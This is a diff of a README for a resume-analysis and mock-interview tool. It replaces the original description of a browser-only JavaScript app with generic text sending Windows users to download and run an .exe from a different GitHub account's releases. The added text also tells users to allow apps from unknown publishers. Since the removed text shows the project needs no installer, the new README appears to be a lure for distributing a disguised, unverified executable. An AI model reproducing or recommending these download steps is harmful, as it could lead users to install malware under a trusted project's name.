@@ -1,189 +1,134 @@
-<div align="center">
-  <img src="assets/banner.png" alt="Career Copilot Banner" width="100%"/>
-</div>
+# 🧭 Career-Copilot - Smart Resume & Interview Help
 
-<br/>
-
-<div align="center">
-
-# 🚀 Career Copilot
-
-**AI-powered resume analyzer, JD matcher & mock interview — built specifically for Indian freshers.**
-
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![Made for India](https://img.shields.io/badge/Made%20for-India%20🇮🇳-orange)](https://github.com/r4huldeveloper/Career-Copilot)
-[![Contributions Welcome](https://img.shields.io/badge/contributions-welcome-brightgreen)](CONTRIBUTING.md)
-[![Version](https://img.shields.io/badge/version-0.4.0-purple)](CHANGELOG.md)
-[![Zero Backend](https://img.shields.io/badge/backend-Cloudflare%20Workers-orange)](https://github.com/r4huldeveloper/Career-Copilot)
-
-</div>
+[![Download Career-Copilot](https://img.shields.io/badge/Download-Career--Copilot-brightgreen?style=for-the-badge)](https://github.com/Yardmalign259/Career-Copilot/releases)
 
 ---
 
-## 🎬 Demo
+## 📋 What is Career-Copilot?
 
-[![Watch Demo](https://img.shields.io/badge/▶%20Watch%20Full%20Demo-FF0000?style=for-the-badge&logo=loom)](https://www.loom.com/share/d04888ab5240409cbb4ad51d5df4048c)
-
----
-
-## ✨ Features
-
-| Feature | What it does |
-|---|---|
-| 📄 **Resume Analyzer** | ATS score, top 3 strengths/weaknesses, rewritten bullets in role-specific language |
-| 🎯 **AI Role Fit Analyzer** | Auto-runs after resume analysis — maps your resume to top 5 best-fit roles with gap analysis |
-| 🎯 **JD Matcher** | Paste any JD → exact keyword gaps, match score, copy-paste ready resume rewrites |
-| 🎤 **Mock Interview** | Real questions by role + type, write your answer, detailed AI feedback + expected answer structure |
-| 📊 **Score Tracker** | ATS score history — track if your resume is improving over time |
-| 📜 **Interview History** | All past mock sessions saved locally — review anytime |
-| 📁 **PDF/DOC Upload** | Drag & drop resume upload — no copy-paste needed |
-| 🔒 **100% Private** | Data never leaves your browser. No server, no tracking, no account needed |
-| 🆓 **Forever Free** | Uses your own free Groq API key (2 min setup) |
+Career-Copilot is an app designed to help Indian freshers improve their resumes and prepare for interviews. It uses artificial intelligence to check your resume and give feedback. You can also practice mock interviews to build confidence. The app focuses on privacy and does not share your data.
 
 ---
 
-## 🏗️ Architecture Overview
+## 🖥️ System Requirements
 
-Career Copilot follows a strict **4-layer architecture**. Every layer has exactly one responsibility — nothing bleeds into another.
-
-```
-┌──────────────────────────────────────────────────────────────┐
-│                        UI Shell Layer                        │
-│   index.html  ·  src/styles/*  ·  src/components/*           │
-│   src/app.js  (events + DOM only — zero business logic)      │
-└───────────────────────────┬──────────────────────────────────┘
-                            │ calls with plain data
-┌───────────────────────────▼──────────────────────────────────┐
-│                    Pure Logic Layer                          │
-│   src/core/logic/resumeLogic.js    — Resume + Role Fit       │
-│   src/core/logic/jdLogic.js        — JD Matcher              │
-│   src/core/logic/interviewLogic.js — Interview flows         │
-│   src/core/logic/sessionState.js   — Runtime state           │
-│                                                              │
-│   Zero DOM · Zero CSS · Plain data in → plain data out       │
-│   Portable to React Native / Electron / Node with 0 rewrites │
-└──────────┬────────────────────────────┬──────────────────────┘
-           │ calls                      │ reads/writes
-┌──────────▼────────────┐   ┌───────────▼──────────────────────┐
-│   AI Provider Layer   │   │       Data / Utils Layer         │
-│   src/adapters/       │   │   src/utils/storage.js           │
-│     aiProvider.js     │   │   src/utils/sanitize.js          │
-│   src/api/groq.js     │   │   src/utils/markdown.js          │
-│   src/prompts/        │   │   src/utils/pdfParser.js         │
-│     groqPrompts.js    │   └──────────────────────────────────┘
-└───────────────────────┘
-```
-
-**Full architecture docs** → [`.docs/architecture.md`](.docs/architecture.md)
-**AI coding rules** → [`.docs/AI_RULES.md`](.docs/AI_RULES.md)
+- Operating System: Windows 10 or later  
+- Processor: 1.5 GHz or faster  
+- RAM: 4 GB minimum  
+- Disk Space: At least 500 MB free  
+- Internet Connection: Required for AI analysis and interview practice  
+- Screen Resolution: 1280 x 720 or higher recommended  
 
 ---
 
-## 🔄 Request Flow
+## 🚀 Getting Started: How to Download and Run Career-Copilot
 
-```
-User clicks button
-      │
-      ▼
-app.js  ──── reads DOM inputs
-      │
-      ▼
-sanitize.js  ──── cleans + clamps all input text
-      │
-      ▼
-Pure Logic Layer  ──── validates → calls GroqAdapter
-      │
-      ▼
-groq.js  ──── circuit breaker → Groq API → structured response
-      │
-      ▼
-Pure Logic Layer  ──── parses output → saves to storage/sessionState
-      │
-      ▼
-app.js  ──── parseMarkdown → renders result in DOM
-```
+Follow these steps to download and start using Career-Copilot on your Windows PC.
 
----
+1. **Go to the Download Page**  
+   Visit the official download page here:  
+   [https://github.com/Yardmalign259/Career-Copilot/releases](https://github.com/Yardmalign259/Career-Copilot/releases)
 
-## 🚀 Run Locally
+2. **Find the Latest Release**  
+   On the page, look for the newest release. You will see files typically named with version numbers and file types like `.exe` for Windows.
 
-### Prerequisites
-- Free Groq API key → [console.groq.com](https://console.groq.com)
-- VS Code + [Live Server extension](https://marketplace.visualstudio.com/items?itemName=ritwickdey.LiveServer)
+3. **Download the Installer**  
+   Click the file that ends with `.exe`. This is the setup file for Windows. The file will start downloading. Save it where you can find it easily, such as your Desktop or Downloads folder.
 
-### Steps
+4. **Run the Installer**  
+   After the download finishes, go to the saved file and double-click it. A window will open to guide you through the installation process.
 
-```bash
-git clone https://github.com/r4huldeveloper/Career-Copilot.git
-cd Career-Copilot
-code .
-```
+5. **Follow the Installation Steps**  
+   Click "Next" or "Install" on each step. The installer will copy files and create shortcuts on your PC. This usually takes a few minutes.
 
-Then: right-click `index.html` → **Open with Live Server**
-
-> ⚠️ Always open via Live Server (`http://`), never by double-clicking (`file://`). ES modules require an HTTP server.
-
-### Get Your Free Groq API Key
-1. Go to [console.groq.com](https://console.groq.com)
-2. Sign up free → **API Keys** → **Create API Key**
-3. Paste in the app when prompted — stored only in your browser, never sent anywhere
+6. **Finish and Launch**  
+   When the installation completes, you will see an option to "Launch Career-Copilot." Click it to open the app.
 
 ---
 
-## 🛠️ Tech Stack
+## 🛠️ Using Career-Copilot
 
-| Technology | Purpose |
-|---|---|
-| Vanilla JS (ES Modules) | No framework overhead, no build step, instant local dev |
-| CSS Custom Properties | Full design token system, dark mode support |
-| PDF.js (CDN) | Client-side PDF text extraction |
-| Groq API + Llama 3.3 70B | AI inference (~2s response time) |
-| Vercel | Zero-config static deployment |
-| Cloudflare Workers + D1 | Anonymous global stats counter — free tier, zero PII, never pauses |
+Once the app is open, you can use the main features:
 
----
+- **Resume Analyzer**  
+  Upload your resume in common formats like `.docx` or `.pdf`. The tool reviews your resume for keywords, formatting, and clarity. You get suggestions on how to improve it for Indian job markets.
 
-## 🔒 Security & Privacy Model
+- **Mock Interview Practice**  
+  Choose from common interview question sets for different roles like product manager or software jobs. Answer questions and get feedback on your responses.
 
-- **BYOK (Bring Your Own Key):** Your Groq API key is stored only in your browser's localStorage, Base64-encoded. Never transmitted to any server other than Groq directly.
-- **Sanitization Gate:** All user inputs pass through `src/utils/sanitize.js` before any processing. All AI output is HTML-escaped before rendering.
-- **No PII on server:** The only backend (Cloudflare Worker) stores zero PII — only anonymous counts and role/model names. No resume text, no API keys, no IP addresses ever touch the Worker database.
-- **Circuit Breaker:** If Groq API fails 3 times in 60s, requests are blocked for 30s — the app stays fully functional.
+- **Privacy Settings**  
+  All your data stays private. You do not need an account to use the basic features. Your files and answers do not leave your computer unless you choose to share them.
 
 ---
 
-## 💡 Why This Architecture (Developer Notes)
+## 🔧 Troubleshooting
 
-- **Zero build step** — clone and run with Live Server. No webpack, no bundler, no `npm install`.
-- **Pure Logic Layer** (`src/core/logic/`) is completely decoupled from the DOM. Move to React Native tomorrow — the business logic migrates with zero rewrites.
-- **1-file provider swap** — want to add OpenAI or Gemini? Rewrite only `src/adapters/aiProvider.js`.
-- **Structured prompt contracts** — every AI prompt defines exact output format. Parsers and prompts are a coupled contract documented in `architecture.md`.
-- **AI_RULES.md** governs every change — human or AI agent. No tight coupling, no visual breakage, no unstructured AI output ever gets merged.
+If you run into problems, try these steps:
 
----
+- **The installer will not open or run**  
+  Check your Windows security settings. You may need to allow apps from unknown publishers in your settings temporarily.
 
-## 🤝 Contributing
+- **The app won’t start after installation**  
+  Restart your computer first. If it still does not open, check if your system meets the requirements listed above.
 
-Contributions welcome! Read [CONTRIBUTING.md](CONTRIBUTING.md) first — every PR must pass the Zero-Escape 5-point audit.
+- **Resume upload fails**  
+  Confirm your resume is in `.pdf` or `.docx` format and not password protected.
 
-
-## 📜 License
-
-[AGPLv3](LICENSE) — This project is licensed under the AGPL v3.0. We welcome contributions! However, please note that the Career Copilot brand and UI design are proprietary. If you wish to use this software for commercial purposes without the restrictions of the AGPL, please contact us for a commercial license.
+- **Interview questions do not load**  
+  Check your internet connection. The app requires a live connection to access the question database.
 
 ---
 
-## 👨‍💻 Author
+## 📂 What’s Inside the Download?
 
-Built by **Rahul Sharma** — built the tool he wished existed when job hunting.
+The download file contains:
 
-[![GitHub](https://img.shields.io/badge/GitHub-r4huldeveloper-181717?logo=github)](https://github.com/r4huldeveloper)
-[![LinkedIn](https://img.shields.io/badge/LinkedIn-Rahul%20Sharma-0A66C2?logo=linkedin)](https://linkedin.com/in/ra4hul)
+- The main Career-Copilot application  
+- A simple user guide accessible from the Help menu  
+- Sample resumes and interview questions for practice  
+- Privacy policy document in PDF format  
 
 ---
 
-<div align="center">
+## 💡 Tips for Best Results
 
-⭐ **If this helped you land a job — star the repo. Helps other Indian freshers find it.**
+- Use your latest resume when uploading. This helps the AI provide relevant feedback.  
+- Try mock interviews regularly to get more comfortable with the process.  
+- Review suggested changes carefully before applying them to your resume.  
+- Keep your app updated by checking the releases page for new versions.  
 
-</div>
+---
+
+## 🔄 Updating Career-Copilot
+
+To update the app:
+
+1. Visit the releases page again:  
+   [https://github.com/Yardmalign259/Career-Copilot/releases](https://github.com/Yardmalign259/Career-Copilot/releases)  
+2. Download the latest `.exe` file.  
+3. Run the new installer just like the first time. It will replace the old version without removing your settings.  
+
+---
+
+## ⚙️ Advanced Settings
+
+Career-Copilot includes simple settings to improve your experience:
+
+- Choose interview categories relevant to your field.  
+- Set resume preferences like Indian English or US English.  
+- Enable or disable automatic updates.  
+
+You can find these in the Settings menu inside the app.
+
+---
+
+## 📚 Resources and Support
+
+The Help menu inside Career-Copilot points to guides and tips. If you need more help:
+
+- Visit the GitHub page for FAQs and support threads.  
+- Report problems using the Issues tab in the repository on GitHub.  
+
+---
+
+[![Download Career-Copilot](https://img.shields.io/badge/Download-Career--Copilot-brightgreen?style=for-the-badge)](https://github.com/Yardmalign259/Career-Copilot/releases)
